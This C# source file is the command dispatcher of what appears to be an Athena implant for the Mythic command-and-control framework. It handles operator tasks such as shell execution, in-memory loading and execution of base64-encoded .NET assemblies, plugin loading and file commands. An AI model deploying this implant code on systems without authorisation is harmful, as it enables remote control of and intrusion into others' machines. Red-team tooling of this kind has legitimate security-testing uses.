using Athena.Mythic.Model;

using System;
using System.Collections.Generic;
using Athena.Commands.Model;
using Athena.Utilities;
using Newtonsoft.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using System.Text;
using System.IO;

namespace Athena.Commands
{

    public class CommandHandler
    {
        public static void StartJob(MythicJob task)
        {
            MythicJob job = Globals.jobs[task.task.id];
            job.started = true;
            switch (job.task.command)
            {
                case "cat":
                    job.taskresult = checkAndRunPlugin(job.task.command,JsonConvert.DeserializeObject <Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "download":

                    break;
                case "execute-assembly":
                    if (Globals.executeAssemblyTask != "")
                    {
                        job.complete = true;
                        job.errored = true;
                        job.taskresult = "Failed to load assembly. Another assembly is already executing.";
                        job.hasoutput = true;
                    }
                    else
                    {
                        var t = Task.Run(() =>
                        {
                            Globals.executeAssemblyTask = job.task.id;
                            bool running = true;
                            ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                            job.hasoutput = true;
                            using (var consoleWriter = new ConsoleWriter()) {
                                var origStdout = Console.Out;
                                try
                                {
                                    consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
                                    Console.SetOut(consoleWriter);
                                    AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), "");
                                    while (running)
                                    {
                                        if (job.cancellationtokensource.IsCancellationRequested)
                                        {
                                            job.complete = true;
                                            AssemblyHandler.ClearAssemblyLoadContext();
                                            running = false;
                                            Console.SetOut(origStdout);
                                            Globals.executeAssemblyTask = "";
                                        }
                                    }
                                }
                                catch(Exception e)
                                {
                                    Globals.executeAssemblyTask = "";
                                    job.complete = true;
                                    job.taskresult = e.Message;
                                    job.errored = true;
                                    job.hasoutput = true;
                                    running = false;
                                    Console.SetOut(origStdout);
                                }
                            }
                        }, job.cancellationtokensource.Token);
                    }
                    break;
                case "exit":
                    Globals.exit = true;
                    job.complete = true;
                    job.taskresult = "Exiting";
                    job.hasoutput = true;
                    break;
                case "ifconfig":
                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "jobs":
                    Task.Run(() => {
                        string output = "ID\t\t\t\t\t\tName\t\tStatus\r\n";
                        output += "------------------------------------------------------------------------\r\n";
                        foreach (var job in Globals.jobs)
                        {
                            if (job.Value.started)
                            {
                                output += String.Format("{0}\t\t{1}\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Started");
                            }
                            else if (job.Value.complete)
                            {
                                output += String.Format("{0}\t\t{1}\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Completed");
                            }
                            else
                            {
                                output += String.Format("{0}\t\t{1}\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Not Started");
                            }
                        }
                        task.hasoutput = true;
                        task.complete = true;
                        task.taskresult = output;
                    });
                    break;
                case "jobkill":
                    Task.Run(() =>
                    {
                        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == task.task.parameters).Value;
                        if (job != null)
                        {
                            //Attempt the cancel.
                            job.cancellationtokensource.Cancel();

                            //Wait to see if the cancel took.
                            for (int i = 0; i != 30; i++)
                            {
                                //Job exited successfully
                                if (job.complete)
                                {
                                    job.taskresult = $"Task {task.task.parameters} exited successfully.";
                                    job.complete = true;
                                    job.hasoutput = true;
                                    break;
                                }
                                //Job may have failed to cancel
                                if (i == 30 && !job.complete)
                                {
                                    job.taskresult = $"Unable to cancel Task: {task.task.parameters}. Request timed out.";
                                    task.complete = true;
                                    task.hasoutput = true;
                                    task.errored = true;
                                }
                                //30s timeout
                                Thread.Sleep(1000);
                            }
                        }
                        else
                        {
                            job.taskresult = $"Task {task.task.parameters} not found!";
                        }
                    });
                    break;
                case "ls":
                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "load":
                    //Load response should look something like this
                    //{"action": "add", "cmd": command}
                    //{ "task_id": task_id, "user_output": "Loaded command: {}".format(command), "commands": cmd_list, "completed": True }
                    LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                    Console.WriteLine($"Assembly: {lc.assembly}");
                    Console.WriteLine($"Name: {lc.name}");
                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name);
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                //Can these all be merged into one and handled on the server-side?
                case "load-assembly":
                    LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly));
                    break;
                case "load-command":
                    LoadAssembly loadcommand = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcommand.assembly),"test");
                    break;
                case "load-coresploit":
                    LoadAssembly loadcs = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcs.assembly), "test");
                    break;
                case "mkdir":
                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "mv":
                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "reset-assembly-context":
                    job.taskresult = AssemblyHandler.ClearAssemblyLoadContext();
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                case "shell":
                    job.taskresult = Execution.ShellExec(job.task);
                    job.complete = true;
                    break;
                case "sleep":
                    break;
                default:
                    job.taskresult = "Command not found.";
                    job.errored = true;
                    break;
            }
            if (!string.IsNullOrEmpty(job.taskresult))
            {
                job.hasoutput = true;
            }
            else
            {
                job.hasoutput = false;
            }
        }
        static void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
        {
            try
            {
                MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == Globals.executeAssemblyTask).Value;
                job.taskresult += e.Value + Environment.NewLine;
                job.hasoutput = true;
            }
            catch
            {

            }
        }

        static string checkAndRunPlugin(string name, Dictionary<string, object> s)
        {
            if (Globals.loadedcommands.ContainsKey(name))
            {
                return AssemblyHandler.RunLoadedCommand(name, s);
            }
            else
            {
                return "";
            }
        }
        //static void consoleWriter_WriteEvent(object sender, ConsoleWriterEventArgs e)
        //{
        //    try
        //    {
        //        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == Globals.executeAssemblyTask).Value;
        //        job.taskresult += e.Value;
        //        job.hasoutput = true;
        //    }
        //    catch
        //    {

        //    }
        //}
    }
}
